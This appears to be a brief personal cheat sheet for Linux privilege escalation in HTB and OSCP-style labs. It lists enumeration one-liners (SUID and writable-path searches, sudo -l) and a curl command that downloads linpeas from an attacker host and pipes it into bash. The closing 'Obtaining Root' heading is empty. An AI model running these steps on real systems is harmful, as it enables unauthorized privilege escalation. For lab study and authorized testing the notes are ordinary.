# Common Privesc Methods

For Linux privesc I usually like enumerating all directories and unusual files I have access too, and then, running a common binary and some one-liners.

## Identifying Privesc Vector

### One-Liners

Run the following one-liners to enumerate your privs on the box:

- `uname -a` == Gives you linux kernel ver.
- `sudo -l` == Shows you where you have SUDO privs.
- `find / -perm -u=s -type f 2>/dev/null` == Locate SUID Binaries.
- `find / -writable -type d 2>/dev/null` == Locate files you have write access to.

These commands will find the majority of privesc vectors on HTB and OSCP. There is more commands you should try if these don't work but I usually head to linpeas after these.

### Linpeas

Linpeas is a bit outdated but is still effective at finding attack vectors.

```bash
curl -sL http://<myip>/linpeas.sh | bash
```

It is important to carefully read over the output, even the output that linpeas doesn't highlight red.

### Furthur Enumeration

If the `one-liners` **AND** `linpeas` didn't find anything useful, the answer is probably very simple. You most likely just need to like into the files you have read access too. This includes things like:

- Web config files and source code.
- Files in your users home directory.
- Application version exploit *OR* Linux kernel exploit.

If none of the above worked or showed anything interesting, restart from the top, you probably missed something.

## Obtaining Root
